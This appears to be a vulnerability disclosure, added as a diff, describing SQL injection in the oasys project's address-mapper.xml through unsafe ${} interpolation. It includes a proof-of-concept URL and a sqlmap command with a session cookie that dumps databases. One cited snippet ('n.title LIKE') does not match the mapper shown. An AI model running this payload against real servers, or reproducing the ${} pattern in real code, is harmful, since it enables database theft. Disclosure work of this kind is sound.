@@ -1,0 +1,64 @@
+#oasys：      
+#sql injection
+ 
+Location:        
+src/main/resources/mappers/address-mapper.xml  
+
+Code：      
+<mapper namespace="cn.gson.oasys.mappers.AddressMapper">
+	<!-- 判断三个条件
+		1、外部分类是否为空
+		2、字母值是否为空
+		3、关键字是否为空
+	 -->
+	 <select id="allDirector" resultType="java.util.Map">
+		SELECT d.*,u.*
+		FROM aoa_director_users AS u LEFT JOIN aoa_director AS d ON 
+		d.director_id = u.director_id
+		WHERE u.user_id=#{userId} AND u.director_id is NOT null AND u.is_handle=1
+		<if test="pinyin !='ALL'">
+			AND d.pinyin LIKE '${pinyin}%'
+		</if>
+		<if test="outtype !=null and outtype !=''">
+			 AND u.catelog_name = '${outtype}'
+		</if>
+		<if test="baseKey !=null and baseKey !=''">
+		AND
+		(d.user_name LIKE '%${baseKey}%' 
+		OR d.phone_number LIKE '%${baseKey}%' 
+		OR d.companyname LIKE '%${baseKey}%'
+		OR d.pinyin LIKE '${baseKey}%'
+		OR u.catelog_name LIKE '%${baseKey}%'
+		)
+		</if>
+		order by u.catelog_name
+	 </select>
+	
+
+</mapper>
+
+Notice:
+  you can see baseKey ,outtype,pinyin  use ${},not #{},so leads to sql injection
+  
+
+Harm：       
+The attacker only needs an ordinary user to trigger the vulnerability and use the SQL injection vulnerability to obtain database information.
+
+Conditions for Execution：      
+Need a regular account 
+
+Edition：     
+Version = all    
+
+Poc:
+  first ,search allDirector in the project,you will see in the AddrController.java ,outAddress function use this ,so when we requests this url below
+  http://192.168.1.1:8088/outaddresspaging?outtype=a',it will crush
+
+Cause the cause ：           
+Directly use ${%%} for fuzzy query after like, which leads to the generation of loopholes:
+and n.title LIKE'%${baseKey}%'
+
+
+Payload:
+Taking into account the need to log in, and then get the session
+python3 sqlmap.py -u "http://192.168.1.1:8088/outaddresspaging?outtype=a" --cookie "JSESSIONID=4EE408BF99DC179161DF239B142D505F" --dbs --current-db --batch
